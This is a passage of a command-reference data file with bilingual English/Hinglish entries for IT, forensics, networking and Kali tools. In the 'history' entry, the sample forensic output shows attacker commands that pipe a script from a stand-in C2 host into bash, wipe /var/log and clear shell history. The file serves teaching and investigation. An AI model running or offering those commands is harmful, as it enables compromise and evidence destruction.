    "summary_hi": "Log files ki shuruat ya aakhiri lines dekhne aur -f lagakar real-time live log monitor karne ka tool.",
    "options": [
      {
        "flag": "-f / --follow",
        "desc": "Output appended data in real-time as the file grows"
      },
      {
        "flag": "-n <lines>",
        "desc": "Specify number of lines to display (default 10)"
      }
    ],
    "example": "tail -f -n 20 /var/log/auth.log",
    "outputSample": "Sep 30 12:05:01 sec sshd[1410]: Accepted publickey for analyst from 10.0.0.5 port 54120 ssh2\nSep 30 12:05:02 sec sudo: analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/bash"
  },
  {
    "id": "it-21",
    "cmd": "dmesg",
    "syntax": "dmesg [options]",
    "category": "it",
    "subCategory": "Kernel Ring Buffer",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Examines and controls the kernel ring buffer. Displays bootup hardware detection, device driver messages, and kernel panics.",
    "summary_hi": "Linux kernel ke messages aur hardware events (jaise USB insert hona ya memory crash) ko display karta hai.",
    "options": [
      {
        "flag": "-T / --ctime",
        "desc": "Print human-readable timestamps rather than seconds since boot"
      },
      {
        "flag": "-l <level>",
        "desc": "Filter by log level (emerg, alert, crit, err, warn, notice, info)"
      },
      {
        "flag": "-w / --follow",
        "desc": "Wait for new kernel messages in real time"
      }
    ],
    "example": "dmesg -T | grep -i usb | tail -n 4",
    "outputSample": "[Wed Sep 30 11:45:10 2026] usb 1-1: new high-speed USB device number 4 using xhci_hcd\n[Wed Sep 30 11:45:11 2026] usb-storage 1-1:1.0: USB Mass Storage device detected\n[Wed Sep 30 11:45:12 2026] sd 2:0:0:0: [sdb] 31260672 512-byte logical blocks: (16.0 GB/14.9 GiB)"
  },
  {
    "id": "it-22",
    "cmd": "whoami / id",
    "syntax": "whoami | id [options] [user]",
    "category": "it",
    "subCategory": "Identity Verification",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Prints current effective username, user ID (UID), primary group ID (GID), and supplementary group memberships.",
    "summary_hi": "Aap kis user ke roop me login hain aur aapke paas kaun-kaun se security groups ki membership hai, check karta hai.",
    "options": [
      {
        "flag": "-u",
        "desc": "Print only the numerical user ID"
      },
      {
        "flag": "-g",
        "desc": "Print only the numerical group ID"
      },
      {
        "flag": "-G",
        "desc": "Display all groups the user belongs to"
      }
    ],
    "example": "id",
    "outputSample": "uid=1000(analyst) gid=1000(analyst) groups=1000(analyst),4(adm),24(cdrom),27(sudo),110(lxd),998(docker)"
  },
  {
    "id": "it-23",
    "cmd": "useradd / usermod",
    "syntax": "useradd [options] <username> | usermod [options] <username>",
    "category": "it",
    "subCategory": "Account Administration",
    "level": "Core",
    "dangerLevel": "Admin",
    "summary": "Creates new system users and modifies existing user account settings (home directory, shell, secondary groups).",
    "summary_hi": "System me naye users create karne aur unhe sudo/admin group me add karne ka management tool.",
    "options": [
      {
        "flag": "-m",
        "desc": "Create the user's home directory"
      },
      {
        "flag": "-s <shell>",
        "desc": "Specify login shell (e.g. /bin/bash)"
      },
      {
        "flag": "-aG <group>",
        "desc": "Append user to supplementary group without removing existing ones (e.g. -aG sudo)"
      }
    ],
    "example": "sudo useradd -m -s /bin/bash secops && sudo usermod -aG sudo secops",
    "outputSample": "[Created user secops, home directory /home/secops, added to group sudo]"
  },
  {
    "id": "it-24",
    "cmd": "sfc /scannow (Windows)",
    "syntax": "sfc /scannow [options]",
    "category": "it",
    "subCategory": "Windows Integrity Verification",
    "level": "Core",
    "dangerLevel": "Admin",
    "summary": "Windows System File Checker. Scans the integrity of all protected system files and replaces corrupted files with cached copies.",
    "summary_hi": "Windows OS ki corrupted ya virus se badli gayi system files ko scan karke original copy se repair karta hai.",
    "options": [
      {
        "flag": "/scannow",
        "desc": "Scans all protected system files immediately and repairs where possible"
      },
      {
        "flag": "/verifyonly",
        "desc": "Scans without performing any repairs or modifications"
      }
    ],
    "example": "sfc /scannow",
    "outputSample": "Beginning system scan. This process will take some time.\nBeginning verification phase of system scan.\nVerification 100% complete.\nWindows Resource Protection did not find any integrity violations."
  },
  {
    "id": "it-25",
    "cmd": "net user (Windows)",
    "syntax": "net user [username [password | *] [options]] [/domain]",
    "category": "it",
    "subCategory": "Windows User Auditing",
    "level": "Core",
    "dangerLevel": "Safe / Admin",
    "summary": "Windows native command-line utility for viewing, creating, and modifying user accounts and password policies.",
    "summary_hi": "Windows computer ya Active Directory domain par active users dekhne aur password reset karne ka tool.",
    "options": [
      {
        "flag": "<username>",
        "desc": "View detailed account information (last logon, password expiry, group membership)"
      },
      {
        "flag": "/add <user> <pass>",
        "desc": "Create a new local Windows account"
      },
      {
        "flag": "/domain",
        "desc": "Perform the operation on the Active Directory Domain Controller"
      }
    ],
    "example": "net user Administrator",
    "outputSample": "User name                    Administrator\nAccount active               Yes\nAccount expires              Never\nPassword last set            2026-08-15 09:30:14\nLocal Group Memberships      *Administrators"
  },
  {
    "id": "for-11",
    "cmd": "dc3dd",
    "syntax": "dc3dd if=<source> of=<destination> [options]",
    "category": "forensics",
    "subCategory": "DoD Enhanced Forensics Imager",
    "level": "Advanced",
    "dangerLevel": "Critical / Forensic",
    "summary": "Enhanced version of dd developed by the US Department of Defense Cyber Crime Center. Features on-the-fly hashing and verification.",
    "summary_hi": "DoD dwara banaya gaya forensic disk cloning tool jo copy karte waqt hi real-time SHA-256 hash verify karta hai.",
    "options": [
      {
        "flag": "hash=sha256",
        "desc": "Calculate on-the-fly SHA-256 hash of image"
      },
      {
        "flag": "log=<file>",
        "desc": "Save detailed verification log to audit trail"
      },
      {
        "flag": "progress=on",
        "desc": "Display transfer speed and sector completion percentage"
      }
    ],
    "example": "dc3dd if=/dev/sdb of=/evidence/usb_evidence.raw hash=sha256 log=/evidence/audit.log",
    "outputSample": "dc3dd 7.2 completed successfully.\n[source] 15630336 sectors (8.0 GB) copied\n[sha256] 9b2d35...64a2  /evidence/usb_evidence.raw\nVerification: MATCHED"
  },
  {
    "id": "for-12",
    "cmd": "md5sum / sha256sum",
    "syntax": "sha256sum [options] <file> | md5sum [options] <file>",
    "category": "forensics",
    "subCategory": "Cryptographic Hashing",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Computes cryptographic hashes of files. Fundamental for establishing legal Chain of Custody and verifying forensic evidence integrity.",
    "summary_hi": "Evidence files ka unique digital fingerprint (hash) banata hai taaki court me prove ho sake ki data me koi chhedchhad nahi hui.",
    "options": [
      {
        "flag": "-c <hashfile>",
        "desc": "Check and verify files against list of previously recorded hashes"
      },
      {
        "flag": "--status",
        "desc": "Don't generate any output, return status code shows success"
      }
    ],
    "example": "sha256sum disk_image.E01",
    "outputSample": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  disk_image.E01"
  },
  {
    "id": "for-13",
    "cmd": "hexdump",
    "syntax": "hexdump [options] <file>",
    "category": "forensics",
    "subCategory": "Binary & Hex Inspection",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Displays file contents in hexadecimal, decimal, octal, or ASCII formats. Used for examining raw file headers and magic bytes.",
    "summary_hi": "File ke raw bytes (Magic Numbers jaise MZ, PK, PNG, PDF) ko hex format me inspect karne ka tool.",
    "options": [
      {
        "flag": "-C",
        "desc": "Canonical hex+ASCII display (standard side-by-side hex and text view)"
      },
      {
        "flag": "-n <length>",
        "desc": "Interpret only length bytes of input"
      },
      {
        "flag": "-s <offset>",
        "desc": "Skip offset bytes from the beginning of the file"
      }
    ],
    "example": "hexdump -C -n 32 unknown_file.bin",
    "outputSample": "00000000  4d 5a 90 00 03 00 00 00  04 00 00 00 ff ff 00 00  |MZ..............|\n00000010  b8 00 00 00 00 00 00 00  40 00 00 00 00 00 00 00  |........@.......|"
  },
  {
    "id": "for-14",
    "cmd": "last / lastb",
    "syntax": "last [options] [username] | lastb [options]",
    "category": "forensics",
    "subCategory": "Login Log Auditing",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Searches through /var/log/wtmp and /var/log/btmp files to list successfully logged-in users, system reboots, and failed login attempts.",
    "summary_hi": "System me pichhle sabhi successful aur failed (unauthorized) login attempts ki time aur IP list dikhata hai.",
    "options": [
      {
        "flag": "-n <num>",
        "desc": "Show only specified number of recent entries"
      },
      {
        "flag": "-i",
        "desc": "Display IP address of remote hosts instead of hostname"
      },
      {
        "flag": "-F",
        "desc": "Print full login and logout times and dates"
      }
    ],
    "example": "last -n 5 -i",
    "outputSample": "analyst  pts/0        192.168.1.100    Wed Sep 30 10:14   still logged in\nroot     pts/1        10.0.0.5         Wed Sep 30 08:12 - 09:40  (01:28)\nreboot   system boot  0.0.0.0          Wed Sep 30 08:00   still running"
  },
  {
    "id": "for-15",
    "cmd": "history",
    "syntax": "history [options]",
    "category": "forensics",
    "subCategory": "Command Line Auditing",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Displays the list of previously executed commands with line numbers from ~/.bash_history. Essential for investigating unauthorized actions.",
    "summary_hi": "User dwara terminal par pehle chalayi gayi commands ki puri timeline aur history inspect karta hai.",
    "options": [
      {
        "flag": "<num>",
        "desc": "Display only the last <num> executed commands"
      },
      {
        "flag": "-c",
        "desc": "Clear history list (anti-forensics technique frequently used by attackers)"
      },
      {
        "flag": "-w",
        "desc": "Write current history buffer immediately to history file"
      }
    ],
    "example": "HISTTIMEFORMAT=\"%F %T \" history | tail -n 5",
    "outputSample": "  482  2026-09-30 09:12:04 curl -s http://malicious.c2/drop.sh | bash\n  483  2026-09-30 09:12:15 rm -rf /var/log/*\n  484  2026-09-30 09:12:20 history -c"
  },
  {
    "id": "for-16",
    "cmd": "strace",
    "syntax": "strace [options] <command_or_pid>",
    "category": "forensics",
    "subCategory": "System Call Diagnostics",
    "level": "Advanced",
    "dangerLevel": "Safe / Forensic",
    "summary": "Diagnostic, debugging and forensic tool. Intercepts and records the system calls made by a process and the signals received.",
    "summary_hi": "Kisi program dwara kernel se maange gaye system calls (file read, network connect) ko live trace karta hai.",
    "options": [
      {
        "flag": "-p <PID>",
        "desc": "Attach to an already running process PID"
      },
      {
        "flag": "-e trace=<call>",
        "desc": "Trace only specific system calls (e.g. -e trace=open,connect,read)"
      },
      {
        "flag": "-o <file>",
        "desc": "Write trace output to log file"
      },
      {
        "flag": "-f",
        "desc": "Trace child processes created by fork()"
      }
    ],
    "example": "strace -e trace=network ./suspicious_binary",
    "outputSample": "socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 3\nconnect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr(\"185.220.101.5\")}, 16) = 0"
  },
  {
    "id": "for-17",
    "cmd": "auditctl",
    "syntax": "auditctl [options]",
    "category": "forensics",
    "subCategory": "Linux Kernel Audit Subsystem",
    "level": "Advanced",
    "dangerLevel": "Admin",
    "summary": "Controls the behavior and rules of the Linux Audit subsystem (auditd). Logs file modifications, privilege changes, and execve calls.",
    "summary_hi": "Linux kernel audit system me rules set karta hai taaki critical files me chhedchhad hote hi alert generate ho.",
    "options": [
      {
        "flag": "-l",
        "desc": "List all currently active audit rules"
      },
      {
        "flag": "-w <path> -p wa -k <key>",
        "desc": "Watch file for write/attribute change and tag with key"
      },
      {
        "flag": "-D",
        "desc": "Delete all active audit rules"
      }
    ],
    "example": "sudo auditctl -w /etc/shadow -p wa -k shadow_tampering",
    "outputSample": "[Audit Rule Active: Tracking /etc/shadow write modifications under key \"shadow_tampering\"]"
  },
  {
    "id": "for-18",
    "cmd": "tcpflow",
    "syntax": "tcpflow [options] -r <pcap_file>",
    "category": "forensics",
    "subCategory": "Network Session Reassembly",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Reconstructs and demultiplexes actual data streams from network packet capture files into separate reassembled flow files.",
    "summary_hi": "PCAP capture me se files (images, HTML, scripts) ko alag-alag flow files me automatically assemble karta hai.",
    "options": [
      {
        "flag": "-r <file.pcap>",
        "desc": "Read packets from pcap file"
      },
      {
        "flag": "-o <dir>",
        "desc": "Output directory for extracted payload flows"
      },
      {
        "flag": "-C",
        "desc": "Print flow packets directly to console with colors"
      }
    ],
    "example": "tcpflow -r incident.pcap -o /tmp/flows/",
    "outputSample": "tcpflow: processing incident.pcap...\nExtracted 14 completed TCP streams into /tmp/flows/\n192.168.001.050.00080-192.168.001.100.54120"
  },
  {
    "id": "for-19",
    "cmd": "fls (The Sleuth Kit)",
    "syntax": "fls [options] <image_file> [inode]",
    "category": "forensics",
    "subCategory": "Filesystem Inode & Deletion Analyzer",
    "level": "Advanced",
    "dangerLevel": "Safe / Forensic",
    "summary": "The Sleuth Kit (TSK) command. Lists directory entries and inodes in a disk image, revealing deleted files marked with an asterisk (*).",
    "summary_hi": "Disk image ke andar deleted files ko dhoondhta hai jo recycle bin se bhi permanent delete kar di gayi hon.",
    "options": [
      {
        "flag": "-r",
        "desc": "Recursively display directory tree"
      },
      {
        "flag": "-d",
        "desc": "Display only deleted file entries"
      },
      {
        "flag": "-p",
        "desc": "Display the full file path for each directory entry"
      }
    ],
    "example": "fls -d -p /evidence/disk.raw",
    "outputSample": "d/d * 4210: /Users/victim/Desktop/confidential.docx\nr/r * 4212: /Users/victim/AppData/Local/Temp/mimikatz.exe"
  },
  {
    "id": "for-20",
    "cmd": "istat (The Sleuth Kit)",
    "syntax": "istat [options] <image_file> <inode_number>",
    "category": "forensics",
    "subCategory": "Inode Metadata & MACB Timestamps",
    "level": "Advanced",
    "dangerLevel": "Safe / Forensic",
    "summary": "Displays detailed metadata of an inode or MFT record (Modified, Accessed, Changed, Birth timestamps, file size, sector allocation).",
    "summary_hi": "Kisi file ke inode ka raw metadata aur charon MACB timestamps (Modified, Accessed, Created, Born) print karta hai.",
    "options": [
      {
        "flag": "-o <offset>",
        "desc": "Sector offset of partition in disk image"
      },
      {
        "flag": "-z <timezone>",
        "desc": "Timezone string for converting UTC timestamps"
      }
    ],
    "example": "istat /evidence/disk.raw 4210",
    "outputSample": "Inode: 4210\nAllocated File\nGroup: 1000\nSize: 45020 bytes\nModified:   2026-09-30 08:14:22 UTC\nAccessed:   2026-09-30 08:20:00 UTC\nCreated:    2026-09-28 14:10:02 UTC\nDirect Blocks: 14205, 14206, 14207"
  },
  {
    "id": "net-26",
    "cmd": "host",
    "syntax": "host [options] <name_or_ip> [server]",
    "category": "networking",
    "subCategory": "DNS Lookup",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Simple DNS lookup utility that translates domain names to IP addresses and conducts reverse lookups.",
    "summary_hi": "Domain name ka IP address ya reverse lookup check karne ka simple command line tool.",
    "options": [
      {
        "flag": "-t <type>",
        "desc": "Specify query type (A, CNAME, MX, TXT)"
      },
      {
        "flag": "-a",
        "desc": "Display all DNS records for target domain"
      }
    ],
    "example": "host -t A google.com",
    "outputSample": "google.com has address 142.250.190.46\ngoogle.com has IPv6 address 2607:f8b0:4004:c07::65"
  },
  {
    "id": "kali-31",
    "cmd": "tshark",
    "syntax": "tshark [options]",
    "category": "kali",
    "subCategory": "Terminal Packet Dissection",
    "level": "Advanced",
    "dangerLevel": "Audit/Probe",
    "summary": "Terminal-based Wireshark packet capture and deep protocol dissection utility. Filters PCAPs and dumps credentials from network streams.",
    "summary_hi": "Wireshark ka command line version jo PCAP files ko bina GUI ke terminal me dissect karta hai.",
    "options": [
      {
        "flag": "-r <file.pcap>",
        "desc": "Read packets from capture file"
      },
      {
        "flag": "-Y \"<filter>\"",
        "desc": "Apply Wireshark display filter (e.g. -Y \"http.request.method==POST\")"
      },
      {
        "flag": "-T fields -e <field>",
        "desc": "Extract specific protocol fields (e.g. -e ip.src -e http.host)"
      }
    ],
    "example": "tshark -r capture.pcap -Y \"http\" -T fields -e ip.src -e http.host -e http.request.uri",
    "outputSample": "192.168.1.100  target.local  /login.php\n192.168.1.100  target.local  /admin/dashboard.php"
  },
  {
    "id": "kali-32",
    "cmd": "airmon-ng",
    "syntax": "airmon-ng <start|stop|check> <interface> [channel]",
    "category": "kali",
    "subCategory": "Wireless Interface Controller",
    "level": "Core",
    "dangerLevel": "Audit/Wireless",
    "summary": "Enables and disables monitor mode on wireless network interfaces. Kills interfering network processes before Wi-Fi auditing.",
    "summary_hi": "Wi-Fi adapter ko monitor mode me daal kar aas-paas ke wireless packets sunne yogya banata hai.",
    "options": [
      {
        "flag": "check kill",
        "desc": "Identify and kill background processes that could interfere with wireless sniffing"
      },
      {
        "flag": "start <iface>",
        "desc": "Enable monitor mode on wireless interface (e.g. wlan0 -> wlan0mon)"
      },
      {
        "flag": "stop <iface>",
        "desc": "Disable monitor mode and restore managed Wi-Fi mode"
      }
    ],
    "example": "sudo airmon-ng check kill && sudo airmon-ng start wlan0",
    "outputSample": "Killing these processes:\n  PID Name\n  842 wpa_supplicant\n[PHY]phy0 [INTERFACE]wlan0 [DRIVER]ath9k_htc - [MONITOR]wlan0mon enabled"
  },
  {
    "id": "it-26",
    "cmd": "free",
    "syntax": "free [options]",
    "category": "it",
    "subCategory": "Memory Utilization",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Displays total amount of free and used physical memory (RAM) and swap space in the system, as well as buffers and caches.",
    "summary_hi": "System me kitni RAM use ho rahi hai, kitni free hai aur swap memory ka kya status hai, check karta hai.",
    "options": [
      {
        "flag": "-h",
        "desc": "Display all output fields in human-readable units (e.g. 16Gi, 4.2Gi)"
      },
      {
        "flag": "-m",
        "desc": "Display memory in Megabytes"
      },
      {
        "flag": "-s <sec>",
        "desc": "Continuously poll memory usage every N seconds"
      }
    ],
    "example": "free -h",
    "outputSample": "               total        used        free      shared  buff/cache   available\nMem:            15Gi       4.2Gi       8.4Gi       210Mi       2.8Gi        10Gi\nSwap:          4.0Gi          0B       4.0Gi"
  },
  {
    "id": "it-27",
    "cmd": "uptime",
    "syntax": "uptime [options]",
    "category": "it",
    "subCategory": "System Load & Availability",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Tells how long the system has been running, how many users are currently logged on, and the system load averages for the past 1, 5, and 15 minutes.",
    "summary_hi": "System kitne ghante ya dino se lagatar chal raha hai aur CPU par kitna load hai, batata hai.",
    "options": [
      {
        "flag": "-p / --pretty",
        "desc": "Show uptime in pretty, clean format (e.g. \"up 2 weeks, 3 days\")"
      },
      {
        "flag": "-s / --since",
        "desc": "Display exact date and time the system booted"
      }
    ],
    "example": "uptime -p",
    "outputSample": "up 14 weeks, 2 days, 4 hours, 12 minutes"
  }
];
